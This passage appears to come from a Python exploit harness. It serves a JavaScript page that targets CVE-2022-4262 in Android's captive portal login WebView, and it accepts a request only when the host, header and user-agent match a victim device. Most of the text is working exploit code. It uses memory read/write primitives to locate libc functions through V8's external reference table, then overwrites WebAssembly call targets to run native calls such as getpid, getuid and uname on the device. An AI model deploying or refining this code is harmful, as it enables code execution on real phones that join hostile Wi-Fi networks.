      const sprayCodeTagged = nativeRead32(sprayFuncAddr + 0x18n);
      const codePointerValid = nativeIsPointer(sprayCodeTagged);
      window.__portal_native_wasm_target_valid = false;
      // asm.js functions are regular JSFunctions whose code field points
      // directly at the (synchronously TurboFan-compiled) Code object; scan
      // the Code object (header + instructions + literal pool) for the words.
      const scanBase = codePointerValid ? sprayCodeTagged - 1n : 0n;
      let sprayAddr = 0n;
      let sprayOffset = 0n;
      let anyWordFound = false;
      if (scanBase > 0x1000n) {
        const wordFound = [false, false, false, false, false];
        for (let off = 0n; off < 0x800n; off += 4n) {
          const candidate = scanBase + off;
          let match = true;
          for (let wi = 0; wi < NATIVE_WORDS.length; wi += 1) {
            const word = nativeRead32(candidate + BigInt(wi * 4));
            if (word === NATIVE_WORDS[wi]) {
              wordFound[wi] = true;
            }
            if (word !== NATIVE_WORDS[wi]) {
              match = false;
            }
          }
          if (match) {
            sprayAddr = candidate;
            sprayOffset = off;
            break;
          }
        }
        anyWordFound = wordFound[0];
        let wordHitCount = 0;
        for (let wi = 0; wi < NATIVE_WORDS.length; wi += 1) {
          if (wordFound[wi]) {
            wordHitCount += 1;
          }
        }
        window.__portal_native_spray_word_hits = wordHitCount;
      }
      window.__portal_native_code_pointer_valid = codePointerValid;
      window.__portal_native_any_word_found = anyWordFound;
      window.__portal_native_spray_landed = sprayAddr !== 0n;
      window.__portal_native_spray_offset = Number(sprayOffset);
      window.native_stage("scan_done");
      if (window.__portal_native_spray_landed &&
          window.__portal_native_execute_requested) {
        window.__portal_native_jump_attempted = true;
        const triggerFunc = function portal_native_trigger() { return 0x1234; };
        const triggerAddr = addr_of(triggerFunc);
        const originalCodeAndProto = v8_read64(triggerAddr + 0x18n);
        const newTagged = (sprayAddr - NATIVE_KHEADER + 1n) & 0xffffffffn;
        const newCodeAndProto = (originalCodeAndProto & 0xffffffff00000000n) | newTagged;
        try {
          v8_write64(triggerAddr + 0x18n, newCodeAndProto);
          try {
            const jumpResult = triggerFunc();
            window.__portal_native_jump_result_is_number =
              typeof jumpResult === "number" && Number.isFinite(jumpResult);
            window.__portal_native_jump_result =
              window.__portal_native_jump_result_is_number ? Math.floor(jumpResult) : 0;
          } finally {
            v8_write64(triggerAddr + 0x18n, originalCodeAndProto);
          }
        } catch (_nativeJumpError) {
          v8_write64(triggerAddr + 0x18n, originalCodeAndProto);
        }
      }
    }
    if (window.__portal_code_writable_probe_requested &&
        window.__portal_rw_roundtrip_attempted &&
        window.__portal_rw_roundtrip_match &&
        window.__portal_pointer_model_hint === "32-bit-layout") {
      window.__portal_code_writable_probe_attempted = true;
      const cwRead32 = function (address) {
        return v8_read64(address) & 0xffffffffn;
      };
      const cwIsPointer = function (tagged) {
        return (tagged & 1n) === 1n && tagged > 0x1000n;
      };
      if (window.portal_native_spray_fn) {
        const cwFuncAddr = addr_of(window.portal_native_spray_fn);
        const cwCodeTagged = cwRead32(cwFuncAddr + 0x18n);
        if (cwIsPointer(cwCodeTagged)) {
          const cwCodeObj = cwCodeTagged - 1n;
          const cwTarget = cwCodeObj + 0x40n;
          const cwOriginal = v8_read64(cwTarget);
          const cwMarker = 0xDEADBEEFCAFEBABEn;
          try {
            v8_write64(cwTarget, cwMarker);
            window.__portal_code_writable = v8_read64(cwTarget) === cwMarker;
            v8_write64(cwTarget, cwOriginal);
          } catch (_cwError) {
            try { v8_write64(cwTarget, cwOriginal); } catch (_cwRestoreError) {}
          }
        }
      }
    }
    if (window.__portal_libc_base_probe_requested &&
        window.__portal_native_spray_ready &&
        window.__portal_rw_roundtrip_attempted &&
        window.__portal_rw_roundtrip_match &&
        window.__portal_pointer_model_hint === "32-bit-layout") {
      window.__portal_libc_base_probe_attempted = true;
      const lbRead32 = function (address) {
        return v8_read64(address) & 0xffffffffn;
      };
      const lbIsPointer = function (tagged) {
        return (tagged & 3n) === 1n && tagged > 0x1000n;
      };
      // WasmExportedFunction -> SFI(+0x0c) -> function_data(+0x04)
      // -> WasmInternalFunction(+0x04) -> ref/instance(+0x08)
      // -> WasmInstanceObject.isolate_root(+0x3c).
      let isolateRoot = 0n;
      let isolateRootValid = false;
      let graphDepth = 0;
      let rawFieldBits = 0;
      try {
        const fnAddr = addr_of(window.portal_native_spray_fn);
        const sfi = lbRead32(fnAddr + 0x0cn);
        if (!lbIsPointer(sfi)) {
          graphDepth = 1;
        } else {
          const fdata = lbRead32((sfi - 1n) + 0x04n);
          if (!lbIsPointer(fdata)) {
            graphDepth = 2;
          } else {
            const internal = lbRead32((fdata - 1n) + 0x04n);
            if (!lbIsPointer(internal)) {
              graphDepth = 3;
            } else {
              const instance = lbRead32((internal - 1n) + 0x08n);
              if (!lbIsPointer(instance)) {
                graphDepth = 4;
              } else {
                const base = instance - 1n;
                // Fingerprint raw-pointer layout: bit i = offset 0x14+4*i
                // holds a valid raw pointer (>0x1000, 4-aligned).
                for (let i = 0; i < 20; i += 1) {
                  const off = 0x14n + BigInt(i * 4);
                  const fv = lbRead32(base + off);
                  if (fv > 0x1000n && (fv & 3n) === 0n) {
                    rawFieldBits |= (1 << i);
                  }
                }
                // isolate_root() stores &isolate_data_ + kRootRegisterBias.
                // ARM32: kRootRegisterBias == 0xFFF (constants-arm.h), so the
                // value read here is misaligned by design. Remove the bias to
                // recover the true IsolateData base, then scan its builtin
                // entry table for libchrome.so code pointers.
                const ir = lbRead32(base + 0x3cn);
                const isolateDataBase = ir - 0xFFFn;
                if (ir <= 0x1000n) {
                  graphDepth = 5;
                } else if (isolateDataBase <= 0x1000n ||
                           (isolateDataBase & 3n) !== 0n) {
                  graphDepth = 6;
                } else {
                  isolateRoot = isolateDataBase;
                  isolateRootValid = true;
                  graphDepth = 7;
                }
              }
            }
          }
        }
      } catch (_libcBaseGraphError) {
        if (graphDepth === 0) {
          graphDepth = 1;
        }
      }
      window.__portal_isolate_root_valid = isolateRootValid;
      window.__portal_libc_graph_depth = graphDepth;
      window.__portal_libc_raw_field_bits = rawFieldBits;
      // The builtin entry table is the longest run of consecutive 4-byte-aligned
      // raw code pointers inside the IsolateData. Scan for it (read-only).
      if (isolateRootValid) {
        let top1Len = 0;
        let top1Off = 0;
        let top2Len = 0;
        let top2Off = 0;
        let runLen = 0;
        let runStart = 0;
        const finishRun = function () {
          if (runLen > top1Len) {
            top2Len = top1Len;
            top2Off = top1Off;
            top1Len = runLen;
            top1Off = runStart;
          } else if (runLen > top2Len) {
            top2Len = runLen;
            top2Off = runStart;
          }
          runLen = 0;
        };
        for (let off = 0n; off < 0x8000n; off += 4n) {
          const v = lbRead32(isolateRoot + off);
          if (v > 0x1000n && (v & 3n) === 0n) {
            if (runLen === 0) {
              runStart = Number(off);
            }
            runLen += 1;
          } else if (runLen > 0) {
            finishRun();
          }
        }
        if (runLen > 0) {
          finishRun();
        }
        window.__portal_libc_builtin_run_len = top1Len;
        window.__portal_libc_builtin_run_offset = top1Off;
        window.__portal_libc_second_run_len = top2Len;
        window.__portal_libc_second_run_offset = top2Off;
        // ExternalReferenceTable (external-reference-table.h, 10.6.194):
        //   ref_addr_[kSize] then is_initialized_(u32) then dummy(u32).
        //   ref_addr_[0] == kNullAddress (0).
        //   ref_addr_[1] == abort_with_reason (libchrome C++ fn => Thumb, bit0).
        //   ref_addr_[2..15] == address_of_* data constants (4-aligned, even).
        // EXTERNAL_REFERENCE_LIST position of printf_function is 74 (counted
        // from external-reference.h; no conditional macro precedes it), so its
        // table index is 74 and its byte offset within the table is 74*4=296.
        // ExternalReferenceTable (external-reference-table.h/.cc, 10.6.194) is
        // followed by is_initialized_(u32=1), dummy_stats_counter_(u32=0), then
        // thread_local_top (first field isolate_, a raw even pointer). Locate the
        // table END by the marker [1, 0, even_ptr]. The roots_table before it is
        // all tagged (odd, nonzero), so the FIRST zero word at/after offset 120
        // is ref_addr_[0] (table start). Require index 1 (off+4) valid and index
        // 74 (off+296) Thumb == printf, with off+296 < initOff. All reads stay
        // inside IsolateData (mapped, read-only, no allocation => no GC).
        const isRawPtr = function (w) {
          return (w & 1n) === 0n && w > 0x1000n;
        };
        const isThumbLike = function (w) {
          return (w & 1n) === 1n && w > 0x1000n;
        };
        let initOff = 0;
        for (let off = 0n; off < 0x7ff0n; off += 4n) {
          if (lbRead32(isolateRoot + off) === 1n &&
              lbRead32(isolateRoot + off + 4n) === 0n &&
              isRawPtr(lbRead32(isolateRoot + off + 8n))) {
            initOff = Number(off);
            break;
          }
        }
        let tableOff = 0;
        if (initOff > 0) {
          const limit = BigInt(initOff - 296);
          for (let off = 120n; off < limit; off += 4n) {
            if (lbRead32(isolateRoot + off) === 0n &&
                lbRead32(isolateRoot + off + 4n) > 0x1000n &&
                isThumbLike(lbRead32(isolateRoot + off + 296n))) {
              tableOff = Number(off);
              break;
            }
          }
        }
        let printfThumb = false;
        let printfValid = false;
        if (tableOff > 0) {
          const pf = lbRead32(isolateRoot + BigInt(tableOff + 296));
          printfThumb = (pf & 1n) === 1n;
          printfValid = (pf & ~1n) > 0x1000n;
        }
        window.__portal_libc_elf_magic_found = false;
        window.__portal_libc_elf_pages_back = 0;
        window.__portal_libc_extref_init_off = initOff;
        window.__portal_libc_extref_table_off = tableOff;
        window.__portal_libc_printf_thumb = printfThumb;
        window.__portal_libc_printf_valid = printfValid;
        // Deterministic getpid jump: read printf, derive getpid = printf - 0x4de94,
        // overwrite a wasm g()->i32 function's call_target, call it (the wasm
        // wrapper converts the i32 return to a JS number), then restore.
        if (window.__portal_native_getpid_direct_requested &&
            tableOff > 0 && printfThumb && printfValid) {
          window.__portal_native_direct_attempted = true;
          const printfAddr = lbRead32(isolateRoot + BigInt(tableOff + 296));
          const getpidAddr = (printfAddr - 0x4DE94n) & 0xFFFFFFFFn;
          window.__portal_native_direct_getpid_valid =
            (getpidAddr & 1n) === 1n && (getpidAddr & ~1n) > 0x1000n;
          let i32fn = null;
          try {
            const i32mod = new WebAssembly.Module(window.__portal_native_i32_bytes);
            const i32inst = new WebAssembly.Instance(i32mod);
            i32fn = i32inst.exports.g;
          } catch (_i32PrepErr) {}
          if (window.__portal_native_direct_getpid_valid && i32fn) {
            try {
              const dfnAddr = addr_of(i32fn);
              const dsfi = lbRead32(dfnAddr + 0x0cn);
              const dfdata = lbRead32((dsfi - 1n) + 0x04n);
              const dinternal = lbRead32((dfdata - 1n) + 0x04n);
              const callTargetAddr = (dinternal - 1n) + 0x04n;
              const orig64 = v8_read64(callTargetAddr);
              const origTarget = orig64 & 0xFFFFFFFFn;
              window.__portal_native_direct_call_target_valid = origTarget > 0x1000n;
              const new64 = (orig64 & 0xFFFFFFFF00000000n) | getpidAddr;
              try {
                v8_write64(callTargetAddr, new64);
                try {
                  const r = i32fn();
                  window.__portal_native_direct_result_is_number =
                    typeof r === "number" && Number.isFinite(r);
                  window.__portal_native_direct_result =
                    window.__portal_native_direct_result_is_number ? Math.floor(r) : 0;
                } finally {
                  v8_write64(callTargetAddr, orig64);
                }
              } catch (_directJumpErr) {
                try { v8_write64(callTargetAddr, orig64); } catch (_restoreErr) {}
              }
            } catch (_directGraphErr) {}
          }
        }
        // Phase-5 env probe: call getuid (ARM, no args) then open/read/close
        // /proc/version via a wasm f(a,b,c)->i32 function whose call_target is
        // overwritten per call, writing the version bytes into a known
        // ArrayBuffer backing store. getuid/open/read/close all preserve
        // r4-r11 and r7, so they are safe as call targets (getpid already
        // proved the Thumb path; getuid/read additionally prove the ARM path).
        if (window.__portal_native_env_probe_requested &&
            tableOff > 0 && printfThumb && printfValid) {
          window.__portal_env_probe_attempted = true;
          const pfAddr = lbRead32(isolateRoot + BigInt(tableOff + 296));
          const getuidAddr = (pfAddr - 0xC0F9n) & 0xFFFFFFFFn;
          const openAddr = (pfAddr - 0x49264n) & 0xFFFFFFFFn;
          const readAddr = (pfAddr - 0xBBF9n) & 0xFFFFFFFFn;
          const closeAddr = (pfAddr - 0x4F424n) & 0xFFFFFFFFn;
          const unameAddr = (pfAddr - 0xB3E1n) & 0xFFFFFFFFn;
          const errnoAddr = (pfAddr - 0x505BAn) & 0xFFFFFFFFn;
          const absAddr = (pfAddr - 0xD9C4n) & 0xFFFFFFFFn;
          window.__portal_env_probe_getuid_valid =
            (getuidAddr & 1n) === 0n && (getuidAddr & ~1n) > 0x1000n;
          window.__portal_env_probe_open_valid =
            (openAddr & 1n) === 1n && (openAddr & ~1n) > 0x1000n;
          window.__portal_env_probe_read_valid =
            (readAddr & 1n) === 0n && (readAddr & ~1n) > 0x1000n;
          window.__portal_env_probe_close_valid =
            (closeAddr & 1n) === 1n && (closeAddr & ~1n) > 0x1000n;
          window.__portal_env_probe_uname_valid =
            (unameAddr & 1n) === 0n && (unameAddr & ~1n) > 0x1000n;
          let envNoArgFn = null;
          let envArgFn = null;
          let envIdFn = null;
          try {
            const envModBytes = new Uint8Array([
              0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
              0x01,0x11,0x03,0x60,0x00,0x01,0x7f,0x60,0x03,0x7f,0x7f,0x7f,0x01,0x7f,0x60,0x01,0x7f,0x01,0x7f,
              0x03,0x04,0x03,0x00,0x01,0x02,
              0x07,0x0e,0x03,0x01,0x67,0x00,0x00,0x01,0x66,0x00,0x01,0x02,0x69,0x64,0x00,0x02,
              0x0a,0x10,0x03,0x04,0x00,0x41,0x2a,0x0b,0x04,0x00,0x41,0x2a,0x0b,0x04,0x00,0x20,0x00,0x0b
            ]);
            const envMod = new WebAssembly.Module(envModBytes);
            const envInst = new WebAssembly.Instance(envMod);
            envNoArgFn = envInst.exports.g;
            envArgFn = envInst.exports.f;
            envIdFn = envInst.exports.id;
          } catch (_envPrepErr) {}
          if (envNoArgFn && envArgFn && envIdFn) {
            const resolveCallTarget = function (fn) {
              const fnAddr = addr_of(fn);
              const sfi = lbRead32(fnAddr + 0x0cn);
              const fdata = lbRead32((sfi - 1n) + 0x04n);
              const internal = lbRead32((fdata - 1n) + 0x04n);
              return (internal - 1n) + 0x04n;
            };
            // Resolve the call_target address fresh inside every call so that no
            // allocation (e.g. the ArrayBuffer below) can invalidate a cached raw
            // address via a moving GC between resolution and the write.
            const callViaTarget = function (fn, targetAddr, args) {
              const ctAddr = resolveCallTarget(fn);
              const orig64 = v8_read64(ctAddr);
              const new64 = (orig64 & 0xFFFFFFFF00000000n) | targetAddr;
              let result = null;
              try {
                v8_write64(ctAddr, new64);
                try {
                  result = args.length ? fn(args[0], args[1], args[2]) : fn();
                } finally {
                  v8_write64(ctAddr, orig64);
                }
              } catch (_callErr) {
                try { v8_write64(ctAddr, orig64); } catch (_restoreErr2) {}
              }
              return result;
            };
            try {
              window.__portal_env_probe_call_target_valid =
                (v8_read64(resolveCallTarget(envArgFn)) & 0xFFFFFFFFn) > 0x1000n;
              if (window.__portal_env_probe_call_target_valid) {
                const envStage = function (s) {
                  try {
                    const sx = new XMLHttpRequest();
                    sx.open("POST", "/api/stage", false);
                    sx.setRequestHeader("Content-Type", "application/json");
                    sx.send(JSON.stringify({stage: s}));
                  } catch (_stageSyncErr) {}
                };
                // 0) allocate + resolve the env buffer FIRST, against the clean
                // pre-native-call heap (the pointer-model probe proved this
                // allocation + addr_of + scan path works; run 5 crashed when it
                // ran after the call_target-overwrite canaries).
                const envBuf = new ArrayBuffer(0x1000);
                envStage("env_buf_alloc");
                const envView = new Uint8Array(envBuf);
                envStage("env_buf_view");
                const bufAddr = addr_of(envBuf);
                envStage("env_buf_addrof");
                const expLen = BigInt(envBuf.byteLength);
                let backing = 0n;
                for (let off = 0n; off <= 0x48n; off += 4n) {
                  const w = v8_read64(bufAddr + off);
                  if ((w & 0xffffffffn) === expLen &&
                      ((w >> 32n) & 0xffffffffn) === expLen) {
                    const be = v8_read64(bufAddr + off + 8n);
                    if ((be & 0xffffffffn) !== 0n) {
                      backing = be & 0xffffffffn;
                      break;
                    }
                  }
                }
                envStage("env_backing_resolved=" + (backing !== 0n));
                // Reinterpret a 32-bit address as a signed JS number in
                // [-2^31, 2^31-1] so the wasm JS->i32 conversion cannot truncate
                // the top bit. (Run 6 showed the wrapper wraps correctly and the
                // backing address had bit 31 clear; this is kept for robustness.)
                const signed32 = function (v) {
                  v = v & 0xFFFFFFFFn;
                  return v >= 0x80000000n ? Number(v) - 0x100000000 : Number(v);
                };
                // 1) getuid via g — sanity (proven: ARM + 0-param, isolated uid).
                const u = callViaTarget(envNoArgFn, getuidAddr, []);
                if (typeof u === "number" && Number.isFinite(u) && u >= 0) {
                  window.__portal_env_probe_getuid_result = Math.floor(u);
                }
                envStage("env_getuid_g_done");
                // 2) uname via f — the goal (kernel version). Keep the native-call
                // count minimal (2) to match the run-1 pattern that succeeded.
                if (backing !== 0n) {
                  const backingU32 = backing & 0xFFFFFFFFn;
                  const backingSigned = signed32(backingU32);
                  window.__portal_env_probe_backing_signed = backingU32 >= 0x80000000n;
                  if (window.__portal_env_probe_uname_valid) {
                    const ur = callViaTarget(envArgFn, unameAddr, [backingSigned, 0, 0]);
                    if (typeof ur === "number" && Number.isFinite(ur)) {
                      window.__portal_env_probe_uname_result = Math.floor(ur);
                      if (ur === 0) {
                        const envReadStr = function (off, len) {
                          let s = "";
                          for (let i = 0; i < len; i += 1) {
                            const b = envView[off + i];
                            if (b === 0) break;
                            if (b >= 0x20 && b <= 0x7e) s += String.fromCharCode(b);
                          }
                          return s;
                        };
                        const sysname = envReadStr(0, 65);
                        const release = envReadStr(130, 65);
                        const version = envReadStr(195, 65);
                        const machine = envReadStr(260, 65);
                        window.__portal_env_probe_version =
                          (sysname + " " + release + " " + version + " " + machine).trim();
                      }
                    }
                  }
                  envStage("env_uname_done");
                }
              }
            } catch (_envCallErr) {}
          }
        }
      }
    }
    const portal_primitive = window.__portal_diag_address_nonzero &&
      window.__portal_diag_same_object &&
      (!window.__portal_rw_roundtrip_attempted ||
        window.__portal_rw_roundtrip_match);
    window.native_stage("report_sending");
    window.portal_report(portal_primitive ? "primitive_candidate" : "not_confirmed",
      portal_primitive, window.__portal_diag_address_nonzero,
      window.__portal_diag_recovered_object, window.__portal_diag_same_object,
      window.__portal_trigger_observed, window.__portal_probe_array_length);
}
</script></html>
"""
    page_script = page_script.replace(
        "window.__portal_pointer_model_probe_requested = false;",
        "window.__portal_pointer_model_probe_requested = "
        f"{str(probe_arraybuffer_pointer_model).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_backing_store_rw_probe_requested = false;",
        "window.__portal_backing_store_rw_probe_requested = "
        f"{str(probe_arraybuffer_backing_store_rw).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_layout_probe_requested = false;",
        "window.__portal_layout_probe_requested = "
        f"{str(probe_layout).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_native_getpid_requested = false;",
        "window.__portal_native_getpid_requested = "
        f"{str(native_getpid).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_native_execute_requested = false;",
        "window.__portal_native_execute_requested = "
        f"{str(native_execute).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_code_writable_probe_requested = false;",
        "window.__portal_code_writable_probe_requested = "
        f"{str(probe_code_writable).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_libc_base_probe_requested = false;",
        "window.__portal_libc_base_probe_requested = "
        f"{str(probe_libc_base).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_native_getpid_direct_requested = false;",
        "window.__portal_native_getpid_direct_requested = "
        f"{str(native_getpid_direct).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_native_env_probe_requested = false;",
        "window.__portal_native_env_probe_requested = "
        f"{str(native_env_probe).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_webgl_graph_probe_requested = false;",
        "window.__portal_webgl_graph_probe_requested = "
        f"{str(probe_webgl_graph).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_webgl_vtable_probe_requested = false;",
        "window.__portal_webgl_vtable_probe_requested = "
        f"{str(probe_webgl_vtable).lower()};",
    )
    page_script = page_script.replace(
        "window.__portal_webgl_trigger_probe_requested = false;",
        "window.__portal_webgl_trigger_probe_requested = "
        f"{str(probe_webgl_trigger).lower()};",
    )
    page_script = page_script.replace("__SPRAY_D0__", SPRAY_D0_LITERAL)
    page_script = page_script.replace("__SPRAY_D1__", SPRAY_D1_LITERAL)
    page_script = page_script.replace("__SPRAY_D2__", SPRAY_D2_LITERAL)
    page_script = page_script.replace("__WASM_SPRAY_BYTES__", WASM_SPRAY_BYTES_JS)
    page_script = page_script.replace("__WASM_I32_MODULE_BYTES__", WASM_I32_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_MULTI8_MODULE_BYTES__", WASM_MULTI8_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_MULTI1_MODULE_BYTES__", WASM_MULTI1_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_TRAMP_MODULE_BYTES__", WASM_TRAMP_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_I32X3_MODULE_BYTES__", WASM_I32X3_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_I32X4_MODULE_BYTES__", WASM_I32X4_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_DISPATCH_MODULE_BYTES__", WASM_DISPATCH_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_DISPATCH_I64_MODULE_BYTES__", WASM_DISPATCH_I64_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_DIRECT_TEST_MODULE_BYTES__", WASM_DIRECT_TEST_MODULE_BYTES_JS)
    page_script = page_script.replace("__WASM_IMPORT_TEST_MODULE_BYTES__", WASM_IMPORT_TEST_MODULE_BYTES_JS)
    page_script = page_script.replace("__TRAMP_WORDS__", TRAMP_WORDS_JS)
    return page_script.encode("utf-8")


def matches_target(handler):
    if urllib.parse.urlsplit(handler.path).path != TARGET_PATH:
        return False
    if handler.headers.get("Host", "").split(":", 1)[0] != TARGET_HOST:
        return False
    if handler.headers.get("X-Requested-With", "") != "com.android.captiveportallogin":
        return False
    ua = handler.headers.get("User-Agent", "")
    return all(part in ua for part in TARGET_UA_PARTS)


class CandidateHandler(http.server.BaseHTTPRequestHandler):
    server_version = "PortalCVE20224262Stage1/1.0"
    sys_version = ""

    def log_message(self, _format, *_args):
        return

    def send_bytes(self, status, content_type, body):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "no-referrer")
        if content_type.startswith("text/html"):
            self.send_header(
                "Content-Security-Policy",
                "default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; "
                "connect-src 'self'; style-src 'unsafe-inline'; "
                "base-uri 'none'; form-action 'none'",
            )
        self.end_headers()
        if body:
            self.wfile.write(body)

    def is_page_client(self):
        return (
            self.server.page_served
            and self.client_address[0] == self.server.page_client_ip
            and self.headers.get("User-Agent", "") == self.server.page_user_agent
        )

    def do_GET(self):
        path = urllib.parse.urlsplit(self.path).path
        if path not in {TARGET_PATH, "/gen_204", "/mobile/status.php"}:
            self.send_bytes(204, "text/plain; charset=utf-8", b"")
            return

        if path == TARGET_PATH and self.headers.get("X-Requested-With", "") != "com.android.captiveportallogin":
            self.send_bytes(200, "text/html; charset=utf-8", CAPTIVE_HINT)
            return

        with self.server.serve_lock:
            already_served = self.server.page_served
            serve_page = matches_target(self) and not already_served
            if serve_page:
                self.server.page_served = True
                self.server.page_client_ip = self.client_address[0]
                self.server.page_user_agent = self.headers.get("User-Agent", "")

        if serve_page:
            label = (
                "webgl_probe_page"
                if self.server.webgl_probe_mode
                else ("pressure_calibration_page" if self.server.calibration_mode else "cve2022_4262_page")
            )
            print(
                f"{label}=served_once; "
                "pressure_allocation_cap_mib="
                f"{self.server.pressure_max_bytes // (1024 * 1024)}",
                flush=True,
            )
            self.send_bytes(200, "text/html; charset=utf-8", self.server.page)
        elif already_served:
            self.send_bytes(200, "text/html; charset=utf-8", CAPTIVE_HINT)
        else:
            print(
                "cve2022_4262_page=blocked; target_gate_mismatch="
                f"host={self.headers.get('Host', '<missing>')[:100]!r} "
                f"x_requested_with={self.headers.get('X-Requested-With', '<missing>')[:100]!r} "
                f"user_agent={self.headers.get('User-Agent', '<missing>')[:220]!r}",
                flush=True,
            )
            self.send_bytes(200, "text/html; charset=utf-8", CAPTIVE_HINT)

    def do_POST(self):
        path = urllib.parse.urlsplit(self.path).path
        if path == "/api/stage":
            try:
                length = int(self.headers.get("Content-Length", "-1"))
            except ValueError:
                length = -1
            if 0 < length <= 256:
                try:
                    payload = json.loads(self.rfile.read(length))
                    if isinstance(payload, dict) and isinstance(payload.get("stage"), str):
                        print(f"native_stage={payload['stage'][:64]!r}", flush=True)
                except (UnicodeDecodeError, json.JSONDecodeError):
                    pass
            self.send_bytes(204, "text/plain; charset=utf-8", b"")
            return
        if path != REPORT_PATH or not self.is_page_client():
            if path == REPORT_PATH:
                print(
                    "report_rejected reason=not_page_client "
                    f"client_ip={self.client_address[0]!r} "
                    f"expected_ip={self.server.page_client_ip!r} "
                    f"ua_match={self.headers.get('User-Agent', '') == self.server.page_user_agent}",
                    flush=True,
                )
            self.send_bytes(404, "text/plain; charset=utf-8", b"")
            return
        try:
            length = int(self.headers.get("Content-Length", "-1"))
        except ValueError:
            length = -1
        if not 0 < length <= MAX_REPORT_BYTES:
            print(f"report_rejected reason=too_large length={length}", flush=True)
            self.send_bytes(413, "text/plain; charset=utf-8", b"")
            return
        try:
            report = json.loads(self.rfile.read(length))
        except (UnicodeDecodeError, json.JSONDecodeError):
            self.send_bytes(400, "text/plain; charset=utf-8", b"")
            return
        common_pressure_valid = (
            isinstance(report, dict)
            and type(report.get("pressure_allocation_bytes")) is int
            and 0 <= report["pressure_allocation_bytes"] <= self.server.pressure_max_bytes
            and type(report.get("pressure_allocation_calls")) is int
            and 0 <= report["pressure_allocation_calls"] <= self.server.pressure_max_calls
            and report["pressure_allocation_bytes"] == (
                report["pressure_allocation_calls"] * self.server.pressure_allocation_size
            )
            and all(
                report.get(key) is None
                or (type(report[key]) is int and 0 <= report[key] <= (2**53 - 1))
                for key in ("heap_used_start_bytes", "heap_used_bytes", "heap_limit_bytes")
            )
        )
        if self.server.webgl_probe_mode:
            valid = (
                isinstance(report, dict)
                and set(report) == {
                    "mode", "webgl1_supported", "webgl2_supported",
                    "webgl2_software_rendering", "webgl2_version",
                    "webgl2_renderer", "webgl2_vendor", "webgl2_unmasked_vendor",
                    "webgl2_unmasked_renderer", "webgl2_discard_framebuffer",
                    "webgl2_max_texture_size", "webgl2_error",
                }
                and report.get("mode") == "webgl_probe"
                and all(
                    type(report.get(key)) is bool
                    for key in (
                        "webgl1_supported", "webgl2_supported",
                        "webgl2_software_rendering", "webgl2_discard_framebuffer",
                    )
                )
                and all(
                    type(report.get(key)) is str
                    for key in (
                        "webgl2_version", "webgl2_renderer", "webgl2_vendor",
                        "webgl2_unmasked_vendor", "webgl2_unmasked_renderer",
                        "webgl2_error",
                    )
                )
                and all(
                    len(report[key]) <= 255
                    for key in (
                        "webgl2_version", "webgl2_renderer", "webgl2_vendor",
                        "webgl2_unmasked_vendor", "webgl2_unmasked_renderer",
                        "webgl2_error",
                    )
                )
                and type(report.get("webgl2_max_texture_size")) is int
                and -1 <= report["webgl2_max_texture_size"] <= 65536
            )
        elif self.server.calibration_mode:
            valid = (
                isinstance(report, dict)
                and set(report) == {
                    "mode", "status", "weakref_supported", "weakref_target_cleared",
                    "finalization_supported", "finalization_signal", "finalization_callbacks",
                    "allocation_attempts", "allocation_failures", "pressure_allocation_bytes",
                    "pressure_allocation_calls", "heap_used_start_bytes",
                    "heap_used_bytes", "heap_limit_bytes",
                }
                and report.get("mode") == "pressure_calibration"
                and type(report.get("status")) is str
                and report.get("status") in {
                    "collection_observed", "no_collection_observed", "unsupported", "allocation_failed",
                }
                and type(report.get("weakref_supported")) is bool
                and type(report.get("weakref_target_cleared")) is bool
                and report["weakref_supported"] == (report["status"] != "unsupported")
                and (
                    report["status"] == "allocation_failed"
                    or report["weakref_target_cleared"] == (report["status"] == "collection_observed")
                )
                and type(report.get("finalization_supported")) is bool
                and type(report.get("finalization_signal")) is bool
                and type(report.get("finalization_callbacks")) is int
                and 0 <= report["finalization_callbacks"] <= 1
                and report["finalization_signal"] == (report["finalization_callbacks"] > 0)
                and type(report.get("allocation_attempts")) is int
                and 0 <= report["allocation_attempts"] <= self.server.pressure_max_attempts
                and type(report.get("allocation_failures")) is int
                and 0 <= report["allocation_failures"] <= report["allocation_attempts"]
                and report["allocation_attempts"] == (
                    report["allocation_failures"] + report["pressure_allocation_calls"]
                )
                and (
                    report["status"] != "allocation_failed"
                    or (
                        report["allocation_failures"] > 0
                        and report["pressure_allocation_calls"] == 0
                    )
                )
                and common_pressure_valid
            )
        else:
            valid = (
                isinstance(report, dict)
                and set(report) == {
                    "status", "primitive", "address_nonzero", "recovered_object",
                    "same_object", "trigger_observed", "array_length",
                    "rw_roundtrip_attempted", "rw_roundtrip_match",
                    "pointer_model_probe_attempted", "arraybuffer_layout_32",
                    "arraybuffer_layout_64", "backing_store_nonzero",
                    "backing_store_upper32_nonzero", "pointer_model_hint",
                    "backing_store_rw_probe_attempted", "backing_store_rw_read_match",
                    "backing_store_rw_write_match", "backing_store_rw_restore_match",
                    "pressure_allocation_bytes", "pressure_allocation_calls", "heap_used_bytes",
                    "pressure_allocation_attempts", "pressure_allocation_failures",
                    "heap_used_start_bytes", "heap_limit_bytes",
                    "layout_probe_attempted", "jsfunc_code_pointer_valid",
                    "jsfunc_code_map_pointer_valid", "jsfunc_code_region_far",
                    "wasm_code_pointer_valid", "wasm_code_map_pointer_valid",
                    "wasm_code_region_far",
                    "native_spray_ready", "native_code_pointer_valid",
